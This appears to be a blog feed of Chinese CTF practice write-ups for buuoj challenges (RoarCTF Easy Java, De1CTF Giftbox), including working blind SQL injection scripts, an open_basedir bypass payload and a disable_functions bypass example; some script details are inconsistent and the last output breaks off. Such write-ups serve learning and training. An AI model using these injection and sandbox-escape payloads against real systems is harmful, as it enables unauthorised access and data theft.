<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> example: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so</span><br><span class="line"></span><br><span class="line">cmdline: &#x2F;readflag &gt; &#x2F;tmp&#x2F;xx 2&gt;&amp;1</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">flag&#123;6e16639a-9eca-45b8-a972-e61da4146393&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ctf</tag>
        <tag>极客大挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录9</title>
    <url>/2020/01/24/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%959/</url>
    <content><![CDATA[<h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>WEB-INF是Java的WEB应用的安全目录。所谓安全就是客户端无法访问，只有服务端可以访问的目录。<br>如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。<br>/WEB-INF/web.xml : Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>
<a id="more"></a>

<p>/WEB-INF/classes/ : 包含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中。<br>/WEB-INF/lib/ : 存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件。<br>页面放在WEB-INF目录下面,这样可以限制访问,提高安全性.如JSP,html</p>
<p>在get方式拿不到文件的时候试试post</p>
<h3 id="0x01-分析-amp-操作"><a href="#0x01-分析-amp-操作" class="headerlink" title="0x01 分析&amp;操作"></a>0x01 分析&amp;操作</h3><p>下载web.xml文件查看</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.IndexController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>IndexController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Index<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.LoginController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>LoginController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Login<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.DownloadController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Download<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/Flag<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>其中有一个FlagController，尝试下载这个文件</p>
<p>下载后直接打开，发现有一串base64编码，解码后就是flag</p>
<p><img src="/pic/37.png" alt=""></p>
<p><code>flag{cb0751c7-6081-482d-8b03-f0edede8e178}</code></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>roarctf</tag>
      </tags>
  </entry>
  <entry>
    <title>buuoj刷题记录8</title>
    <url>/2020/01/12/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%958/</url>
    <content><![CDATA[<h2 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>totp:TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。TOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。</p>
<p>SQL盲注</p>
<p>open_basedir绕过</p>
<a id="more"></a>



<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>打开网页发现是类似一个linux终端的界面，cd，ls，cat，clear，help，exix，输入help提示可运行下列命令，ls查看后，发现有一个usage.md</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">login [username] [password]</span><br><span class="line"><span class="built_in">logout</span></span><br><span class="line">launch</span><br><span class="line">targeting [code] [position]</span><br><span class="line">destruct</span><br></pre></td></tr></table></figure>

<p>fuzz后发现要登入，登入抓包的时候发现有一个totp参数</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/shell.php?a=login%20admin%20admin&amp;totp=59858608</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=urs1ifeeiqsj6dam5rvs0l50nt</span><br></pre></td></tr></table></figure>

<p>进行login时发现username处存在单引号sql盲注，执行usage中其他操作需要登入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin<span class="string">' admin</span></span><br><span class="line"><span class="string">login fail, user not found.</span></span><br><span class="line"><span class="string">[de1ta@de1ta-mbp /sandbox]% login admin'</span><span class="comment"># admin</span></span><br><span class="line">login fail, password incorrect.</span><br><span class="line">[de1ta@de1ta-mbp /sandbox]% targeting</span><br><span class="line">login first.</span><br><span class="line">[de1ta@de1ta-mbp /sandbox]% launch</span><br><span class="line">login first.</span><br></pre></td></tr></table></figure>

<p>查看源码，再main.js发现了数据提交过程，和服务器totp设置</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">···</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[Developer Notes]</span></span><br><span class="line"><span class="comment">OTP Library for Python located in js/pyotp.zip</span></span><br><span class="line"><span class="comment">Server Params:</span></span><br><span class="line"><span class="comment">digits = 8</span></span><br><span class="line"><span class="comment">interval = 5</span></span><br><span class="line"><span class="comment">window = 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">        url: host + <span class="string">'/shell.php?a='</span>+<span class="built_in">encodeURIComponent</span>(input)+<span class="string">'&amp;totp='</span> + <span class="keyword">new</span> TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>,<span class="number">8</span>).genOTP(),</span><br><span class="line">        type: <span class="string">"GET"</span>,</span><br><span class="line">        dataType: <span class="string">'json'</span>,</span><br><span class="line">        success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">            e_main.html($(<span class="string">'#main'</span>).html() + <span class="string">'[&lt;span id="usr"&gt;'</span> + usrName + <span class="string">'&lt;/span&gt;@&lt;span class="host"&gt;de1ta-mbp&lt;/span&gt; '</span> + position + <span class="string">']% '</span> + input + <span class="string">'&lt;br/&gt;'</span> + res.message + <span class="string">'&lt;br/&gt;'</span>)</span><br><span class="line">            <span class="keyword">if</span> (e_console.height()-$(<span class="built_in">window</span>).height()&gt;<span class="number">0</span>)&#123;e_console.css(<span class="string">'top'</span>,-(e_console.height()-$(<span class="built_in">window</span>).height()));&#125;<span class="keyword">else</span>&#123;e_console.css(<span class="string">'top'</span>,<span class="number">5</span>);&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">            e_main.html($(<span class="string">'#main'</span>).html() + <span class="string">'[&lt;span id="usr"&gt;'</span> + usrName + <span class="string">'&lt;/span&gt;@&lt;span class="host"&gt;de1ta-mbp&lt;/span&gt; '</span> + position + <span class="string">']% '</span> + input + <span class="string">'&lt;br/&gt;System Fatal Error!&lt;br/&gt;'</span>)</span><br><span class="line">            <span class="keyword">if</span> (e_console.height()-$(<span class="built_in">window</span>).height()&gt;<span class="number">0</span>)&#123;e_console.css(<span class="string">'top'</span>,-(e_console.height()-$(<span class="built_in">window</span>).height()));&#125;<span class="keyword">else</span>&#123;e_console.css(<span class="string">'top'</span>,<span class="number">5</span>);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">···</span><br></pre></td></tr></table></figure>

<h3 id="0x02-操作"><a href="#0x02-操作" class="headerlink" title="0x02 操作"></a>0x02 操作</h3><p>编写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 1/14/2020 9:42 PM</span></span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"login admin'/**/and/**/("</span>+payload+<span class="string">")# admin"</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(params)</span></span><br><span class="line">    html = requests.get(url,params=params,).text</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">64</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, len+<span class="number">1</span>):</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line">            url = <span class="string">'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'</span></span><br><span class="line">            html = get(url, payload)</span><br><span class="line">            <span class="comment"># print(html, '*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        result += chr(mid)</span><br><span class="line">        print(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload,<span class="number">7</span>)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tabls</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\'giftbox\''</span></span><br><span class="line">    tables=binsea(s_payload,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\'users\''</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select/**/concat(password)/**/from/**/users'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_database()</span></span><br><span class="line">    <span class="comment"># get_tabls()</span></span><br><span class="line">    <span class="comment"># get_columns()</span></span><br><span class="line">    <span class="comment"># get_data()</span></span><br></pre></td></tr></table></figure>

<p>数据库是giftbox,只有一个users表，有<code>id,username,password</code></p>
<p>admin的密码是<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p>
<p>根据密码的提示得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[de1ta@de1ta-mbp &#x2F;sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named &#39;eval&#39; when launching missiles.</span><br></pre></td></tr></table></figure>

<p>targeting  还有长度限制，code为2，possition为12。</p>
<p>在phpiofo中设置了open_basedir</p>
<p><img src="/pic/37.png" alt=""></p>
<p>关于open_basedir<br>   open_basedir是php.ini中的一个配置选项<br>   它可将用户访问文件的活动范围限制在指定的区域，<br>   假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。<br>   注意用open_basedir指定的限制实际上是前缀,而不是目录名。<br>   举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。</p>
<p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544487.html" target="_blank" rel="noopener">绕过参考文章</a></p>
<p>绕过payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));&#96;</span><br></pre></td></tr></table></figure>

<p>附上完整脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 1/14/2020 9:42 PM</span></span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sesssion=requests.session()</span><br><span class="line">url = <span class="string">'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"login admin'/**/and/**/("</span>+payload+<span class="string">")# admin"</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(params)</span></span><br><span class="line">    html = requests.get(url,params=params,).text</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">64</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, len+<span class="number">1</span>):</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            html = get(url, payload)</span><br><span class="line">            <span class="comment"># print(html, '*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        result += chr(mid)</span><br><span class="line">        print(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload,<span class="number">7</span>)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tabls</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\'giftbox\''</span></span><br><span class="line">    tables=binsea(s_payload,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\'users\''</span></span><br><span class="line">    columns=binsea(s_payload,<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select/**/concat(password)/**/from/**/users'</span></span><br><span class="line">    password=binsea(s_payload,<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;"</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    sesssion.get(url, params=params)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target</span><span class="params">(code,position)</span>:</span></span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"targeting"</span>+code+<span class="string">' '</span>+position,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    sesssion.get(url,params=params)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"destruct"</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    sesssion.get(url, params=params)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'launch'</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    print(sesssion.get(url, params=params).json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># get_database()</span></span><br><span class="line">    <span class="comment"># get_tabls()</span></span><br><span class="line">    <span class="comment"># get_columns()</span></span><br><span class="line">    get_data()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    login()</span><br><span class="line">    target(<span class="string">'a'</span>,<span class="string">'chdir'</span>)</span><br><span class="line">    target(<span class="string">'b'</span>,<span class="string">'img'</span>)</span><br><span class="line">    target(<span class="string">'c'</span>,<span class="string">'&#123;$a($b)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'d'</span>,<span class="string">'ini_set'</span>)</span><br><span class="line">    target(<span class="string">'e'</span>, <span class="string">'open_base_dir'</span>)</span><br><span class="line">    target(<span class="string">'f'</span>, <span class="string">'..'</span>)</span><br><span class="line">    target(<span class="string">'g'</span>, <span class="string">'&#123;$d($e,$f)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'h'</span>, <span class="string">'&#123;$a($f)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'i'</span>, <span class="string">'&#123;$a($f)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'j'</span>, <span class="string">'&#123;$a($f)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'k'</span>,<span class="string">'&#123;$a($f)&#125;'</span> )</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'l'</span>, <span class="string">'/'</span>)</span><br><span class="line">    target(<span class="string">'m'</span>, <span class="string">'&#123;$d($e,$l)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'n'</span>, <span class="string">'eaho'</span>)</span><br><span class="line">    target(<span class="string">'o'</span>, <span class="string">'file_get_'</span>)</span><br><span class="line">    target(<span class="string">'p'</span>, <span class="string">'contents'</span>)</span><br><span class="line">    target(<span class="string">'q'</span>, <span class="string">'$o$p'</span>)</span><br><span class="line">    target(<span class="string">'r'</span>, <span class="string">'flag'</span>)</span><br><span class="line">    target(<span class="string">'s'</span>,<span class="string">'&#123;$n($q(r))&#125;'</span> )</span><br><span class="line">    launch()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	get_flag():</span><br></pre></td></tr></table></figure>

<p>返回结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;'code': 0, 'message': 'Initializing launching system...&lt;br&gt;Setting target: $a = "chdir";&lt;br&gt;Reading target: $a = "chdir";&lt;br&gt;Setting target: $b = "img";&lt;br&gt;Reading target: $b = "img";&lt;br&gt;Setting target: $c = "&#123;$a($b)&#125;";&lt;br&gt;Reading target: $c = "1";&lt;br&gt;Setting target: $d = "ini_set";&lt;br&gt;Reading target: $d = "ini_set";&lt;br&gt;Setting target: $e = "open_basedir";&lt;br&gt;Reading target: $e = "open_basedir";&lt;br&gt;Setting target: $f = "..";&lt;br&gt;Reading target: $f = "..";&lt;br&gt;Setting target: $g = "&#123;$d($e,$f)&#125;";&lt;br&gt;Reading target: $g = "/app:/sandbox";&lt;br&gt;Setting target: $h = "&#123;$a($f)&#125;";&lt;br&gt;Reading target: $h = "1";&lt;br&gt;Setting target: $i = "&#123;$a($f)&#125;";&lt;br&gt;Reading target: $i = "1";&lt;br&gt;Setting target: $j = "Ly8v";&lt;br&gt;Reading target: $j = "Ly8v";&lt;br&gt;Setting target: $k = "base64_";&lt;br&gt;Reading target: $k = "base64_";&lt;br&gt;Setting target: $l = "decode";&lt;br&gt;Reading target: $l = "decode";&lt;br&gt;Setting target: $m = "$k$l";&lt;br&gt;Reading target: $m = "base64_decode";&lt;br&gt;Setting target: $n = "&#123;$m($j)&#125;";&lt;br&gt;Reading target: $n = "///";&lt;br&gt;Setting target: $o = "&#123;$d($e,$n)&#125;";&lt;br&gt;Reading target: $o = "..";&lt;br&gt;Setting target: $p = "flag";&lt;br&gt;Reading target: $p = "flag";&lt;br&gt;Setting target: $q = "file_get";&lt;br&gt;Reading target: $q = "file_get";&lt;br&gt;Setting target: $r = "_contents";&lt;br&gt;Reading target: $r = 